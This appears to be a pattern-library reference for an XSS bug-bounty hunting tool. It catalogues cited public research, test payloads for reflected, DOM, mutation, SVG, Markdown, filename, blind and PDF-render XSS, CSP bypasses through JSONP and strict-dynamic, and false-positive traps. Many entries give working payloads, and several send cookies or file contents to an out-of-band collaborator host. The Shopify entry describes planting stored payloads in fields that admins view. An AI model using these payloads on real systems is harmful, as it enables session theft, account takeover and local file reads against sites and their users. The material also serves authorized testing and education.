# hunt-xss — Pattern Library

> Patterns and verifiable public examples behind `hunt-xss`. Operator-grade reference, not a complete enumeration. Cited examples are widely-discussed public cases that any reader can search and verify; uncited patterns are general operator knowledge from public bounty disclosures, CVEs, OWASP guidance, and conference research.

XSS pays when it combines privileged context (admin UI, billing flow, SSO callback), persistent delivery (stored payload, blind delivery into an internal console), and scope escalation (cookie exfil, CSRF chain, ATO). The patterns below focus on the primitives that recur in real disclosed reports — header reflection, DOM sinks, mutation XSS, SVG, CSP bypasses, and the blind-XSS workflow. Every pattern includes a proof shape because XSS is the easiest bug class to *think* you have when you don't.

## Cited Public Examples

### Gareth Heyes / PortSwigger DOM XSS and mXSS research
- **Source:** PortSwigger Research, multi-year body of work by Gareth Heyes and others. Topics include the DOM XSS wiki, the mutation-XSS catalog, and the "DOM Invader" Burp tool. Searchable at portswigger.net/research; cite the topic, not a specific URL.
- **Pattern shape:** A category of XSS where the payload never round-trips through the server. The attacker controls a fragment, `window.name`, `postMessage` payload, or imported JSON, and a client-side script writes that data into a sink (`innerHTML`, `document.write`, `eval`, `setTimeout`-with-string, `srcdoc`) without escaping. Server-side scanners miss it entirely.
- **Key trick:** The mXSS variant exploits the fact that browsers *renormalize* HTML when it goes into an attribute or namespace and comes back out — a string that looks inert as HTML can become live HTML after a round trip through `innerHTML = node.innerHTML`.
- **Why it matters:** DOM and mXSS bypass server-side sanitizers entirely, which means they bypass most WAFs and most pentest scopes. They consistently pay because the affected code paths sit in trusted SPAs and admin SPAs where one payload can reach session storage.

### Mario Heiderich / Cure53 SVG and namespace XSS research
- **Source:** Cure53 published research on SVG XSS, namespace confusion, and the limits of HTML sanitizers (DOMPurify is maintained by this team). Search by topic; the SVG-foreignObject and namespace-switching primitives are well-documented in HTML5 security literature.
- **Pattern shape:** SVG is an XML dialect that can embed `<script>` natively and can also contain `<foreignObject>` carrying arbitrary HTML. An application that accepts SVG uploads (avatars, profile images, badges, social-share thumbnails) and serves them with `Content-Type: image/svg+xml` will execute embedded scripts when the file is loaded as a top-level navigation, or in some contexts when rendered inline.
- **Key trick:** SVG XSS bypasses image-type validation that only checks magic bytes (`<svg>` is text, but image validators that decode the first frame accept it as a valid graphic). It also bypasses CSP `img-src` checks because the navigation context is `script-src`, not `img-src`.
- **Why it matters:** SVG remains a recurring XSS vector in 2025 because the dual nature of the format (image and document) traps developers who think "MIME = image, so no script."

### Shopify XSS class (longstanding pattern)
- **Source:** Shopify's public bug-bounty program (HackerOne `shopify`) has disclosed many XSS reports across its main domain, admin, and `*.myshopify.com` tenant surfaces. Cite the program/class, not a specific report number. The Shopify program has historically been one of the most-disclosed XSS programs in the industry.
- **Pattern shape:** Multi-tenant SaaS where one tenant's content (theme template, product description, app installation surface) renders in another tenant's admin context, or where customer-supplied content (cart notes, order metadata, file-upload filenames) renders in a merchant-admin view without escaping.
- **Key trick:** The merchant-admin context is *privileged* — a stored XSS that fires when a merchant views an order can read merchant API tokens, pivot to billing, and chain to ATO. The lift is finding the unsanitized cross-tenant boundary, not bypassing modern XSS filters.
- **Why it matters:** This is the operator's case study for stored-XSS-in-admin-views — plant payloads in customer-controllable fields, wait for an admin to view them, validate via blind-XSS callback (OOB).

### CSP bypass via JSONP allowlist (general pattern in CVE catalogue)
- **Source:** Multiple CVEs and bug-bounty disclosures over the past decade against sites that allowlist Google services (`accounts.google.com`, `www.google.com/complete/search`), Yandex, Twitter widgets, or major CDNs for CSP, then suffer XSS because the allowlisted origin serves a JSONP endpoint that reflects an attacker-controlled callback name.
- **Pattern shape:** Target CSP is strict — `default-src 'self'; script-src 'self' https://www.google.com`. Attacker injects a `<script src="https://www.google.com/complete/search?client=hp&callback=alert(1)">` which is policy-compliant. The JSONP endpoint emits `alert(1)({...})`, executing the callback in the target's origin.
- **Key trick:** CSP allow-lists for third-party origins must be evaluated against the *full* set of script-emitting endpoints on that origin. CDN host names that serve any JSONP, any reflected JavaScript, or any user-content endpoint are *not* safe in `script-src`.
- **Why it matters:** Operators inheriting a "we have CSP, XSS is mitigated" target should grep the CSP allow-list for known JSONP-bearing hosts before giving up on a candidate sink.

---

## Pattern Library

### Reflected XSS via header reflection in error pages
- **When to suspect:** The application echoes `Host`, `X-Forwarded-Host`, `Referer`, `User-Agent`, or a custom header into an HTML response (error page, login form action, redirect template).
- **Test:** `curl -H 'X-Forwarded-Host: x"><svg onload=fetch("//<collab>/x")>' https://target/`. Inspect response body for the literal payload in HTML context.
- **Validation:** OOB callback to Collaborator with a *browser User-Agent* (your curl will not execute JS — the callback fires only when a real victim browser parses the response). Alternative: paste the response into a local browser and confirm `alert` fires.
- **Pay-grade rationale:** Medium typically; high if the affected page is in a privileged context (admin login, SSO callback) where a victim's session can be hijacked.

### DOM XSS via `location.hash` / `window.name`
- **When to suspect:** Single-page app, you find `document.location.hash.slice(1)` or `window.name` read into a sink like `innerHTML`, `document.write`, or `eval`. Burp DOM Invader flags it.
- **Test:** Visit `https://target/page#<img src=x onerror=alert(1)>`. For `window.name`, host a parent page that sets `window.name='<payload>'` then navigates to the target.
- **Validation:** `alert` fires in your browser without the payload ever appearing in the server response.
- **Pay-grade rationale:** Medium to high depending on the context. Stored DOM XSS (where the payload persists via localStorage) pays higher.

### postMessage origin-check bypass
- **When to suspect:** Page registers `window.addEventListener('message', handler)` where `handler` does not check `event.origin` strictly, or uses `indexOf` / `startsWith` checks that allow `https://target.attacker.com`.
- **Test:** Host a page at attacker-controlled origin, `iframe` the target, call `iframe.contentWindow.postMessage(payload, '*')`. If handler trusts the message and reaches a DOM sink with payload data, you have XSS.
- **Validation:** `alert` fires on the target origin after the postMessage.
- **Pay-grade rationale:** High when the handler is on a sensitive page; chain via XSS-to-ATO.

### Mutation XSS through `innerHTML` round-trips
- **When to suspect:** Application uses a sanitizer (DOMPurify, sanitize-html) but then re-serializes the sanitized DOM via `element.innerHTML` or copies into a different namespace (HTML → SVG, HTML → MathML).
- **Test:** Use a known mXSS payload — historical examples include `<svg><style><img src=x onerror=alert(1)>`-style namespace flips and `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p>` constructs. Maintained payload lists exist; iterate against the sanitizer's current version.
- **Validation:** Payload survives the sanitizer in some downstream rendering context and fires.
- **Pay-grade rationale:** High. mXSS bypasses are scarce and typically reach privileged contexts.

### SVG file upload XSS
- **When to suspect:** Avatar / profile-image / share-thumbnail upload accepts SVG, or accepts a file by MIME without validating XML content. Response serves the file at a same-origin URL.
- **Test:** Upload an SVG containing `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//<collab>/x?'+document.cookie)</script></svg>`. Visit the served URL directly (top-level navigation).
- **Validation:** OOB callback carries the victim's cookies (use a victim test account in a second browser).
- **Pay-grade rationale:** High to critical depending on cookie scope (HttpOnly defeats cookie exfil; the chain shifts to CSRF or in-page action).

### Blind XSS into admin / SOC consoles
- **When to suspect:** Any field that round-trips to an internal viewer — error-message parameters, audit-log usernames, support-ticket bodies, file-upload filenames, User-Agent, Referer, contact-form email fields, registration usernames.
- **Test:** `<svg onload=fetch('//bxss-<sink>-<random>.<collab>/x')>`. Plant *early* in the engagement and keep the listener open for hours or days. Sub-tag every sink (different `<sink>` label) so callbacks identify the firing path.
- **Validation:** OOB request from a browser User-Agent, originating from a non-target IP range (the SOC analyst's office or a corporate VPN).
- **Pay-grade rationale:** High when the firing context is the admin console; pays out because impact is "internal session theft."

### CSP bypass via JSONP allow-list
- **When to suspect:** CSP `script-src` lists a third-party host known to serve JSONP (`accounts.google.com`, `www.google.com`, several CDN hosts).
- **Test:** Find a same-origin XSS sink under the target's policy that lets you inject `<script src="https://<allowlisted>/jsonp?callback=PAYLOAD">`. The JSONP endpoint reflects `PAYLOAD` as a function call.
- **Validation:** Payload executes despite CSP enforcement.
- **Pay-grade rationale:** High — bypasses a defense the program likely paid to deploy.

### CSP bypass via `strict-dynamic` and orphaned nonces
- **When to suspect:** CSP uses `'strict-dynamic'` with a nonce, but the page also includes a script that uses `document.createElement('script')` + attacker-controllable `src`. Under `strict-dynamic`, any script created by an already-trusted script is trusted.
- **Test:** Find a same-origin DOM injection that reaches `appendChild` of a `<script>` element whose src you control.
- **Validation:** Script executes under strict-dynamic, despite no inline injection.
- **Pay-grade rationale:** High.

### Self-XSS escalated by clickjacking / login CSRF
- **When to suspect:** You find an XSS that only fires for the logged-in user themselves (e.g. in a profile-edit preview). Standalone, it's self-XSS and pays nothing.
- **Test:** Combine with login-CSRF (force the victim to log into the *attacker's* account) so the self-XSS now fires under the victim's browser context but in the attacker's session. Alternative: combine with a clickjacked iframe that triggers the action while the victim is logged in.
- **Validation:** A victim browser executes the payload via the chain.
- **Pay-grade rationale:** Self-XSS alone = 0. Chained self-XSS with login-CSRF or clickjack = medium to high if a working PoC video is supplied.

### XSS via Markdown rendering edge cases
- **When to suspect:** Application accepts Markdown — comments, issues, wiki pages, profile bios. Renderer is `marked`, `markdown-it`, `commonmark`, or `kramdown`.
- **Test:** Edge cases per renderer: `[xss](javascript://%0aalert(1))`, `![xss](javascript:alert(1))` (older renderers), HTML pass-through if the renderer allows raw HTML (`<img onerror=alert(1) src=x>` inside the markdown body).
- **Validation:** `alert` fires when the rendered page is viewed.
- **Pay-grade rationale:** Medium to high depending on where the rendered content is viewed.

### XSS via PDF / report generation
- **When to suspect:** Target accepts attacker-controlled fields and generates a PDF or HTML report (invoice, receipt, export). Backend renderer is wkhtmltopdf, headless Chrome, or weasyprint.
- **Test:** Inject `<script>fetch('http://<collab>/x?file://etc/passwd')</script>` and `<img src="file:///etc/passwd">`. Wkhtmltopdf historically allowed `file://` loads from the rendered HTML.
- **Validation:** OOB callback from the rendering server (not your browser — server-side rendering) with leaked file contents.
- **Pay-grade rationale:** High to critical. Often crosses into SSRF and local-file-read territory.

### XSS via `target="_blank"` reverse tab-nabbing chain
- **When to suspect:** A user-controlled link is rendered with `target="_blank"` but without `rel="noopener"`. Not XSS standalone; chainable.
- **Test:** Plant a link that opens an attacker page; the attacker page reassigns `window.opener.location` to a phishing target. Chain with reflected XSS on the original page for a full session-theft demonstration.
- **Validation:** Reverse-tab-nabbing PoC video.
- **Pay-grade rationale:** Low standalone; counts only when chained.

### Stored XSS via filename in file-upload feature
- **When to suspect:** Upload feature stores the original filename verbatim and renders it on the file-listing page.
- **Test:** Upload a file named `<svg onload=alert(1)>.png`. Some platforms preserve the name; if the listing renders it raw, the payload fires.
- **Validation:** `alert` fires on the listing page.
- **Pay-grade rationale:** Medium typically; higher if the listing is viewed by admins/support.

---

## Anti-Patterns (FP traps)

### "Reflection" that's URL-encoded or HTML-encoded
- **Looks like:** Your payload `<script>alert(1)</script>` appears in the response.
- **Actually is:** Look closely. If the response shows `&lt;script&gt;alert(1)&lt;/script&gt;` or `%3Cscript%3E`, the framework already encoded it. The browser will render the text "script" inside the page, not execute it.
- **How to disprove:** Save the response to disk and open in a browser. If no alert fires, it's reflection-as-encoded-text, not XSS. The page is doing the right thing.

### WAF rejection on `<` claimed as "filter bypass needed"
- **Looks like:** ASP.NET request validator or a WAF returns 500 / 403 on a payload containing `<`. Operator wants to find a bypass.
- **Actually is:** The framework is blocking *input*, not *output*. The data never reaches the application's output path. Finding an alternative-character bypass doesn't make this XSS; it just lets the request through to be safely encoded later.
- **How to disprove:** Find an input that *does* reach output unencoded (a header, a different parameter, a cookie). If every payload route gets encoded on output, it's a hardened app, not a bypassable one. Lesson reference (authorized SharePoint engagement): request validator blocks `<` before storage; encoding bypasses do not help.

### Natural-language collision in response body
- **Looks like:** You submitted `xsstest123` as the payload and observe `xsstest123` in the response body. Looks reflected.
- **Actually is:** Sometimes the response body legitimately contains the substring for reasons unrelated to your input — pagination state, search result, dictionary word collision. Without confirmation that *your input drove the reflection*, you cannot demonstrate XSS.
- **How to disprove:** Use a unique cryptographically random marker (32 hex chars). If only the literal marker appears, you have true reflection. Then escalate to a real HTML/JS payload — if encoding kicks in at that point, it's reflection-with-output-encoding, not XSS.

### `Content-Type: text/plain` or `application/json` reflection
- **Looks like:** Your payload appears in the response body, but the response is `Content-Type: text/plain` or `application/json`.
- **Actually is:** Browsers do not render HTML or execute JS in plain-text or JSON responses (except in rare MIME-sniffing cases with old IE, which is out of modern scope). The reflection is real but inert.
- **How to disprove:** Open the response in a current browser. If it shows the raw bytes as text, it's not XSS. If you can find a way to make the same endpoint return `text/html` (Accept-header tricks, format=html parameter, `X-Content-Type-Options: nosniff` absent + IE), revisit.
